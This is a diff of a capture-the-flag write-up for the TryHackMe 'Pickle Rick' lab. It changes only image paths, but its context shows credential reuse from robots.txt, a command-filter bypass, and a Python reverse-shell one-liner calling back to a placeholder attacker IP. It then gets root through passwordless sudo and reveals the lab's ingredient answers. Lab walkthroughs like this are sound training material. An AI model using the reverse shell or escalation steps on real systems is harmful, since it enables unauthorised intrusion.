@@ -127,19 +127,19 @@ Navigating to this page shows a simple login form:
 
 Using the username and string from `robots.txt` as the credentials (`R1ckRul3s:Wubbalubbadubdub`) allows us to successfully log in. At which point, we are presented with a command panel, allowing us to interact with the host via built-in commands:
 
-![Pickle Rick - Portal](picklerick_portal.png)
+![Pickle Rick - Portal](tryhackme/images/picklerick_portal.png)
 
 For example, running `ls` returns the directory listing:
 
-![Pickle Rick - ls](picklerick_ls.png)
+![Pickle Rick - ls](tryhackme/images/picklerick_ls.png)
 
 However, attempting to run `cat` against the files results in the following error:
 
-![Pickle Rick - Command Disabled](picklerick_command_disabled.png)
+![Pickle Rick - Command Disabled](tryhackme/images/picklerick_command_disabled.png)
 
 Fortunately, the `less` command is not denied, allowing us to read the first ingredient:
 
-![Pickle Rick - Less](picklerick_less_ingred1.png)
+![Pickle Rick - Less](tryhackme/images/picklerick_less_ingred1.png)
 
 ```
 mr. meeseek hair
@@ -147,11 +147,11 @@ mr. meeseek hair
 
 Viewing `clue.txt` indicates we can look through the filesystem for the other ingredient:
 
-![Pickle Rick - Clue](picklerick_clue.png)
+![Pickle Rick - Clue](tryhackme/images/picklerick_clue.png)
 
 First, let's get a shell on the host so that we can navigate through the filesystem easier. We can use a Python one-liner from [PentestMonkey's Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), modifying it with our attacker IP and chosen listen port:
 
-![Pickle Rick - Which Python3](picklerick_which_python3.png)
+![Pickle Rick - Which Python3](tryhackme/images/picklerick_which_python3.png)
 
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -159,7 +159,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 This results in a successful callback to our attacker machine:
 
-![Pickle Rick - Callback](picklerick_callback.png)
+![Pickle Rick - Callback](tryhackme/images/picklerick_callback.png)
 
 Stabilising the shell with the following commands:
 
@@ -170,7 +170,7 @@ $ export TERM=xterm
 
 Looking around the filesystem, we identify the `rick` user in `/home`:
 
-![Pickle Rick - Rick User](picklerick_rick_user.png)
+![Pickle Rick - Rick User](tryhackme/images/picklerick_rick_user.png)
 
 Within their `/home` directory, there is a `second ingredients` file which we can read:
 
@@ -183,7 +183,7 @@ Within their `/home` directory, there is a `second ingredients` file which we ca
 Now we must escalate our privileges in order to find the 3rd and final ingredient. To do this, we can run `sudo -l` to see if there are any privileges granted to the `www-data` user
 
 
-![Pickle Rick - Sudo -l](picklerick_sudo_l.png)
+![Pickle Rick - Sudo -l](tryhackme/images/picklerick_sudo_l.png)
 
 From the above, we can see that the user can run any `sudo` command without requiring password authentication. This means we can simply run `sudo su` to switch to the `root` user:
 
@@ -191,11 +191,11 @@ From the above, we can see that the user can run any `sudo` command without requ
 $ sudo su
 ```
 
-![Pickle Rick - Privesc](picklerick_privesc.png)
+![Pickle Rick - Privesc](tryhackme/images/picklerick_privesc.png)
 
 Finally, we can read the third ingredient:
 
-![Pickle Rick - Ingredient 3](picklerick_ingredient3.png)
+![Pickle Rick - Ingredient 3](tryhackme/images/picklerick_ingredient3.png)
 
 ```
 fleeb juice
